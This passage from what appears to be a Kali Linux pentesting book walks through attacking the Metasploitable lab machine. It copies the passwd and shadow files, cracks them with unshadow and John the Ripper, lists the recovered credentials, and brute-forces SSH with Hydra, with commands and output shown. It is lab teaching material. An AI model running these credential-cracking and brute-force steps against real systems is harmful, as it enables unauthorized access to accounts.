    ```


    Now just copy the text from this file to your Kali system by simply selecting
    the text with the mouse and copying it to a text file in a local Kali directory.


    I just put the text to a file named "**passwd**" and saved it on the Kali Desktop:


    ![](bbox=[0.013, 0.569, 0.624, 0.948])


    Now just do the same exact thing with the "**shadow-**" file.'
  merge: -1
  pgno: 180
- img_proc: false
  md: 'You should now have two text files, *~/root/Desktop/passwd* and *~/root/Desktop/shadow-*
    on your local Kali system.


    Next we need to take both newly created text files and run the *"Unshadow"* command
    on them from the John the Ripper utilities. This command takes the files and combines
    them into a single file *(cracked)* that John the Ripper can crack:


    ```

    root@kali:~/Desktop# sudo unshadow passwd shadow- > cracked

    ```


    Okay, now that we have the combined "cracked" file, we can unleash John the Ripper
    on it to attempt to retrieve the passwords.


    We will use the wordlist file *"password.lst"* that comes with John:


    ```

    root@kali:~/Desktop# sudo john --wordlist=/usr/share/john/password.lst cracked

    Loaded 7 password hashes with 7 different salts (FreeBSD MD5 [128/128 SSE2 intrinsics
    12x])

    Remaining 1 password hash

    guesses: 0  time: 0:00:00:00 DONE (Fri Nov  1 19:10:42 2013)  c/s: 14184  trying:
    : dirk - sss

    ```


    Okay, 7 password hashes and only one remaining. Now just use the show command
    to see what it found:


    ```

    root@kali:~/Desktop# sudo john --show cracked

    sys:batman:3:3:sys:/dev:/bin/sh

    klog:123456789:103:104::/home/klog:/bin/false

    msfadmin:msfadmin:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash

    postgres:postgres:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash

    user:user:1001:1001:just a user,111,,:/home/user:/bin/bash

    service:service:1002:1002:,,,:/home/service:/bin/bash


    6 password hashes cracked, 1 left

    root@kali:~/Desktop#

    ```


    And there we go; we now have 6 usernames and passwords to play with.


    +   - sys/ batman

    - klog/ 1234567898

    - msfadmin/ msfadmin

    - postgres/ postgres

    - user/ user

    - service/ service


    Looks like the administrator of the box used simple passwords, not a good idea.


    # Automating Password Attacks with Hydra


    Now that we have these passwords, we can take them and use " Hydra " to automate
    attacks against the Metasploitable system''s services.'
  merge: -1
  pgno: 181
- img_proc: false
  md: 'they will work against.


    So, if we want to attack the SSH service with our newly created passwords, we
    could do something like this:


    ```

    root@kali:~/Desktop# hydra -L user -P pass 192.168.198.145 ssh

    Hydra v7.5 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes


    Hydra (http://www.thc.org/thc-hydra) starting at 2013-11-02 16:35:44

    [DATA] 16 tasks, 1 server, 81 login tries (l:9/p:9), ~5 tries per task

    [DATA] attacking service ssh on port 22

    [ERROR] ssh protocol error

    [ERROR] ssh protocol error

    [ERROR] ssh protocol error

    [ERROR] ssh protocol error

    [ERROR] ssh protocol error

    [ERROR] ssh protocol error

    [ERROR] ssh protocol error

    [ERROR] ssh protocol error

    [22][ssh] host: 192.168.198.145   login: msfadmin   password: msfadmin

    1 of 1 target successfully completed, 1 valid password found

    Hydra (http://www.thc.org/thc-hydra) finished at 2013-11-02 16:36:02

    root@kali:~/Desktop#

    ```


    The "**-L**" switch lists our username file, "**user**" in this case. The "**-P**"
    switch is the location of our password file, or "**pass**" in this case. Then
    we just list the target IP address and the target service and that is it!


    > *(You can use Hydra-GTK from the Online Password attack menu if you prefer a
    graphical interface)*


    As you can see it found the right combination of username and password pretty
    quick:


    ***msfadmin/ msfadmin***


    Though it is kind of silly trying a small list of passwords that we already know,
    the concept is solid. Without having any of the actual passwords we could use
    hydra with a large username and password dictionary file to try to brute force
    our way into the server.


    # Conclusion


    That is all there is too it. Because we had a root shell, we were able to grab
    the Linux password hashes from the system by simply copying them and pasting them
    to our local machine. We were then able to use John the Ripper to crack them.


    If you took a good look at the Metasploit service scanner programs mentioned in
    an earlier tutorial, you probably noticed some had a place to set usernames and
    passwords. How cool would it be to just feed our newly cracked passwords into
    these scanners and unleash them on the Metasploitable box?'
  merge: -1
  pgno: 182
- img_proc: false
  md: Lastly, as the Hydra automated attack shows us, we need to use long complex
    passwords to protect our servers from brute force attacks.
